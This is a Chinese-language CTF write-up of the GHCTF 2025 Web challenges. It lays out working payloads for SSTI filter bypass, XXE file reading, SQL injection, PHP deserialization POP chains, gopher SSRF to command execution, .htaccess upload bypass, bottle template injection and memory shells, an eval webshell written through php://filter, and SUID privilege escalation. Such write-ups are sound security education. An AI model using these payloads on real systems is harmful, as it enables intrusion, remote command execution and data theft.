+++
date = '2025-03-09T00:27:55+08:00'
title = 'GHCTF-2025-Web-Writeup'
categories = ["Writeup"]
tags = ["writeup", "ctf", "Web"]

+++



战队名：**我要打奥斯汀major**

比赛排名：5



## Web

### upload?SSTI!

读取文件中的内容并进行模板渲染，存在ssti

![img](../assets/1742122180769-6.png)

有waf

```python
def contains_dangerous_keywords(file_path):
    dangerous_keywords = ['_', 'os', 'subclasses', '__builtins__', '__globals__','flag',]

    with open(file_path, 'rb') as f:
        file_content = str(f.read())

        for keyword in dangerous_keywords:
            if keyword in file_content:
                return True  # 找到危险关键字，返回 True
```

简单绕一下

payload:

```sql
{{""['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubcl'+'asses\x5f\x5f']()[139]['\x5f\x5finit\x5f\x5f']['\x5f\x5fglo'+'bals\x5f\x5f']['\x5f\x5fbui'+'ltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('OS'.lower()).popen('cat /f*').read()}}
```

随便传个txt就行

![img](../assets/1742122180769-1.png)



### 

### (>﹏<)

题目

```python
from flask import Flask,request import base64 from lxml import etree import re app = Flask(__name__) @app.route('/') def index(): return open(__file__).read() @app.route('/ghctf',methods=['POST']) def parse(): xml=request.form.get('xml') print(xml) if xml is None: return "No System is Safe." parser = etree.XMLParser(load_dtd=True, resolve_entities=True) root = etree.fromstring(xml, parser) name=root.find('name').text return name or None if __name__=="__main__": app.run(host='0.0.0.0',port=8080)
```

是个xxe

直接读flag

```xml
curl -X POST http://node2.anna.nssctf.cn:28535/ghctf --data-urlencode '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///flag" > ]><root><name>&xxe;</name></root>'
```

![img](../assets/1742122180769-2.png)

### SQL???

```sql
url/?id=1 union select 1,2,3,4,sqlite_version()
```

发现是Sqlite

接着查表就行了

```python
url/?id=1 union select 1,2,3,4,sql from sqlite_master
```

![img](../assets/1742122180769-3.png)

```python
?id=1 union select 1,2,3,4,select flag from flag
//直接从flag表中查flag列就行
```

### Popppppp

题目

```bash
<?php
error_reporting(0);

class CherryBlossom {
    public $fruit1;
    public $fruit2;

    public function __construct($a) {
        $this->fruit1 = $a;
    }

    function __destruct() {
        echo $this->fruit1;
    }

    public function __toString() {
        $newFunc = $this->fruit2;
        return $newFunc();
    }
}

class Forbidden {
    private $fruit3;

    public function __construct($string) {
        $this->fruit3 = $string;
    }

    public function __get($name) {
        $var = $this->$name;
        $var[$name]();
    }
}

class Warlord {
    public $fruit4;
    public $fruit5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->fruit4;
        return $function();
    }

    public function __get($arg1) {
        $this->fruit5->ll2('b2');
    }
}

class Samurai {
    public $fruit6;
    public $fruit7;

    public function __toString() {
        $long = @$this->fruit6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->fruit7->tt2) {
            echo "xxx are the best!!!";
        }
    }
}

class Mystery {

    public function __get($arg1) {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) {
                echo ($day4 . '<br>');
            }
        });
    }
}

class Princess {
    protected $fruit9;

    protected function addMe() {
        return "The time spent with xxx is my happiest time" . $this->fruit9;
    }

    public function __call($func, $args) {
        call_user_func([$this, $func . "Me"], $args);
    }
}

class Philosopher {
    public $fruit10;
    public $fruit11="sr22kaDugamdwTPhG5zU";

    public function __invoke() {
        if (md5(md5($this->fruit11)) == 666) {
            return $this->fruit10->hey;
        }
    }
}

class UselessTwo {
    public $hiddenVar = "123123";

    public function __construct($value) {
        $this->hiddenVar = $value;
    }

    public function __toString() {
        return $this->hiddenVar;
    }
}

class Warrior {
    public $fruit12;
    private $fruit13;

    public function __set($name, $value) {
        $this->$name = $value;
        if ($this->fruit13 == "xxx") {
            strtolower($this->fruit12);
        }
    }
}

class UselessThree {
    public $dummyVar;

    public function __call($name, $args) {
        return $name;
    }
}

class UselessFour {
    public $lalala;

    public function __destruct() {
        echo "Hehe";
    }
}

if (isset($_GET['GHCTF'])) {
    unserialize($_GET['GHCTF']);
} else {
    highlight_file(__FILE__);
}

?>
```

跟去年ghctf的题目几乎一样

https://blog.csdn.net/liaochonxiang/article/details/140361138

走到Mystery类之后利用原生类读文件

POC

```go
import hashlib
import itertools
import string

for i in itertools.product(string.printable, repeat=3):
    s = ''.join(i)
    s1 = hashlib.md5(s.encode()).hexdigest()
    s2 = hashlib.md5(s1.encode()).hexdigest()
    if s2[:3] == '666':
        print(s)
<?php
class CherryBlossom{
    public $fruit1;
    public $fruit2;
}
class Philosopher {
    public $fruit10;
    public $fruit11;
}
class Mystery{
    public $mystery;
}
$s = new CherryBlossom;
$s->fruit1 = new CherryBlossom;
$s->fruit1->fruit2 = new Philosopher;
$s->fruit1->fruit2->fruit11 = 'Okg';
$s->fruit1->fruit2->fruit10 = new Mystery;

# $s->fruit1->fruit2->fruit10->FilesystemIterator='/'; 
$s->fruit1->fruit2->fruit10->SplFileObject='/flag44545615441084';

echo serialize($s);
?>
```

### ez_readfile

题目

```bash
<?php
  show_source(__FILE__);
  if (md5($_POST['a']) === md5($_POST['b'])) {
      if ($_POST['a'] != $_POST['b']) {
          if (is_string($_POST['a']) && is_string($_POST['b'])) {
              echo file_get_contents($_GET['file']);
          }
      }
  }
?>
```

md5强碰撞，我随便找了一对

```go
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

与

M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

接下来的文件包含因为不知道flag名没办法直接读，很自然就能想到cnext

https://github.com/kezibei/php-filter-iconv

我用的这个工具打，感觉比原版好用

利用任意文件读取读maps和libc二进制文件，libc的路径在maps里面有

拿到文件之后直接生成payload打就行了

### ezzzz_pickle

弱口令登录

admin/admin123

登进去之后发现有个任意文件读取

我这里直接打的非预期

直接读环境变量 `/proc/1/environ`，就能拿到flag

预期解应该是读源码然后读环境变量拿key和iv打pickle的

Payload:

```python
POST filename=/proc/1/environ
```

### Goph3rrr 

/app.py可以拿到源码

```python
@app.route('/Manage', methods=['POST'])
def cmd():
    if request.remote_addr != "127.0.0.1":
        return "Forbidden!!!"
    if request.method == "GET":
        return "Allowed!!!"
    if request.method == "POST":
        return os.popen(request.form.get("cmd")).read()
     
@app.route('/Gopher')
def visit():
    url = request.args.get('url')
    if url is None:
        return "No url provided :)"
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == "file" or realIpAddress in BlackList:
        return "No (≧∇≦)"
    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
    return result.stdout
```

主要是这两个路由，一个要本地访问，另一个可以打ssrf

其实这题就是0xgame2024的一道ssrf，几乎没改

payload拿来改一下直接打就行了

payload如下

```python
/Gopher?url=gopher://0.0.0.0:8000/_payload
POST /Manage HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

cmd=env
```

把上面这个url编码两次之后放到payload那里

最终payload

```python
/Gopher?url=gopher://0.0.0.0:8000/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%34%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%37%25%30%61%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%35%25%36%65%25%37%36
```

环境变量里面有flag

### UPUPUP

文件上传，fuzz了一下，感觉php是没什么可能绕过的了

想到打.htaccess

但是应该有exif_imagetype()，正常来说用GIF89a绕过.htaccess会报错

可以通过这个方法绕一下

![img](../assets/1742122180769-4.png)

Payload

```bash
#define width 66
#define height 66
<FilesMatch "1.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### Message in a Bottle

bottle的模板注入

这题waf掉了{}

https://github.com/myzhan/bottle-doc-zh-cn/blob/master/docs/stpl.rst

![img](../assets/1742122180769-5.png)

看了一下文档，发现其实不用{}

Payload

```python
<h>
 %import os;os.system('whoami')
 %end
</h>
```

题目没回显但是出网，我这里直接反弹shell读flag了

### Escape！

漏洞点

```bash
$userData = checkSignedCookie();
if ($userData) {
    #echo $userData;
    $user=unserialize($userData);
    #var_dump($user);
    if($user->isadmin){
        $tmp=file_get_contents("tmp/admin.html");

        echo $tmp;

        if($_POST['txt']) {
            $content = '<?php exit; ?>';
        $content .= $_POST['txt'];
        file_put_contents($_POST['filename'], $content);
        }
    }
    else{
        $tmp=file_get_contents("tmp/admin.html");
        echo $tmp;
        if($_POST['txt']||$_POST['filename']){
        echo "<h1>权限不足，写入失败<h1>";
}
```

经典的死亡杂糅绕过

但是前提是要isadmin为1

看到反序列化，再加上题目暗示与waf有关，自然就想到了反序列化字符串逃逸

Waf

```bash
<?php

function waf($c)
{
    $lists=["flag","'","\\","sleep","and","||","&&","select","union"];
    foreach($lists as $list){
        $c=str_replace($list,"error",$c);
    }
    #echo $c;
    return $c;
}
```

我这里是先随便注册一个账号，然后拿到cookie之后解base64拿到序列化后的数据

```bash
function setSignedCookie($serializedData, $cookieName = 'user_token', $secretKey = 'fake_secretKey') {
    $signature = hash_hmac('sha256', $serializedData, $secretKey);

    $token = base64_encode($serializedData . '|' . $signature);

    setcookie($cookieName, $token, time() + 3600, "/");  // 设置有效期为1小时
}
```

可以看到序列化的数据是直接进行base64编码的

构造出payload

```bash
username flagandandandandandandandandandand";s:7:"isadmin";b:1;}
password 123456  //随意
```

逃逸21个字符

登录之后写马就行，但是要绕一下死亡杂糅

https://xz.aliyun.com/news/7758

payload

```bash
php://filter/convert.base64-decode/resource=1.php
aPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==
//要补一个a
//<?php @eval($_POST[1]);?>
```

### GetShell

题目

```bash
<?php
highlight_file(__FILE__);

class ConfigLoader {
    private $config;

    public function __construct() {
        $this->config = [
            'debug' => true,
            'mode' => 'production',
            'log_level' => 'info',
            'max_input_length' => 100,
            'min_password_length' => 8,
            'allowed_actions' => ['run', 'debug', 'generate']
        ];
    }

    public function get($key) {
        return $this->config[$key] ?? null;
    }
}

class Logger {
    private $logLevel;

    public function __construct($logLevel) {
        $this->logLevel = $logLevel;
    }

    public function log($message, $level = 'info') {
        if ($level === $this->logLevel) {
            echo "[LOG] $message\n";
        }
    }
}

class UserManager {
    private $users = [];
    private $logger;

    public function __construct($logger) {
        $this->logger = $logger;
    }

    public function addUser($username, $password) {
        if (strlen($username) < 5) {
            return "Username must be at least 5 characters";
        }

        if (strlen($password) < 8) {
            return "Password must be at least 8 characters";
        }

        $this->users[$username] = password_hash($password, PASSWORD_BCRYPT);
        $this->logger->log("User $username added");
        return "User $username added";
    }

    public function authenticate($username, $password) {
        if (isset($this->users[$username]) && password_verify($password, $this->users[$username])) {
            $this->logger->log("User $username authenticated");
            return "User $username authenticated";
        }
        return "Authentication failed";
    }
}

class StringUtils {
    public static function sanitize($input) {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }

    public static function generateRandomString($length = 10) {
        return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / strlen($x)))), 1, $length);
    }
}

class InputValidator {
    private $maxLength;

    public function __construct($maxLength) {
        $this->maxLength = $maxLength;
    }

    public function validate($input) {
        if (strlen($input) > $this->maxLength) {
            return "Input exceeds maximum length of {$this->maxLength} characters";
        }
        return true;
    }
}

class CommandExecutor {
    private $logger;

    public function __construct($logger) {
        $this->logger = $logger;
    }

    public function execute($input) {
        if (strpos($input, ' ') !== false) {
            $this->logger->log("Invalid input: space detected");
            die('No spaces allowed');
        }

        @exec($input, $output);
        $this->logger->log("Result: $input");
        return implode("\n", $output);
    }
}

class ActionHandler {
    private $config;
    private $logger;
    private $executor;

    public function __construct($config, $logger) {
        $this->config = $config;
        $this->logger = $logger;
        $this->executor = new CommandExecutor($logger);
    }

    public function handle($action, $input) {
        if (!in_array($action, $this->config->get('allowed_actions'))) {
            return "Invalid action";
        }

        if ($action === 'run') {
            $validator = new InputValidator($this->config->get('max_input_length'));
            $validationResult = $validator->validate($input);
            if ($validationResult !== true) {
                return $validationResult;
            }

            return $this->executor->execute($input);
        } elseif ($action === 'debug') {
            return "Debug mode enabled";
        } elseif ($action === 'generate') {
            return "Random string: " . StringUtils::generateRandomString(15);
        }

        return "Unknown action";
    }
}

if (isset($_REQUEST['action'])) {
    $config = new ConfigLoader();
    $logger = new Logger($config->get('log_level'));

    $actionHandler = new ActionHandler($config, $logger);
    $input = $_REQUEST['input'] ?? '';
    echo $actionHandler->handle($_REQUEST['action'], $input);
} else {
    $config = new ConfigLoader();
    $logger = new Logger($config->get('log_level'));
    $userManager = new UserManager($logger);

    if (isset($_POST['register'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        echo $userManager->addUser($username, $password);
    }

    if (isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        echo $userManager->authenticate($username, $password);
    }

    $logger->log("No action provided, running default logic");
}
```

审计一下

```bash
class CommandExecutor {
    private $logger;

    public function __construct($logger) {
        $this->logger = $logger;
    }

    public function execute($input) {
        if (strpos($input, ' ') !== false) {
            $this->logger->log("Invalid input: space detected");
            die('No spaces allowed');
        }

        @exec($input, $output);
        $this->logger->log("Result: $input");
        return implode("\n", $output);
    }
}
```

有个执行类

当传参Action为run的时候就能走进去了

传参input进行命令执行，waf了空格

尝试读flag发现读不了，要提权

尝试suid提权

```bash
find / -perm -u=s -type f 2>/dev/null
看到有wc，而且wc可以读文件

./wc --files0-from "/flag"
```

### Message in a Bottle plus 

bottle注入的plus版

hint:增加了一点waf和Python语法错误检测，题目不出网

一开始试了很久发现一直说语法错误

后面想了想发现这个语法进行Python语法错误检测确实是会报错的

那我们用多行注释掉不就好了，因为题目不出网，打内存马

参考

https://xz.aliyun.com/news/17049

Payload

```python
"""
% __import__('sys').modules['__main__'].app.route("/c","GET",lambda :__import__('os').popen('whoami').read())
% end
"""
```

访问/c拿回显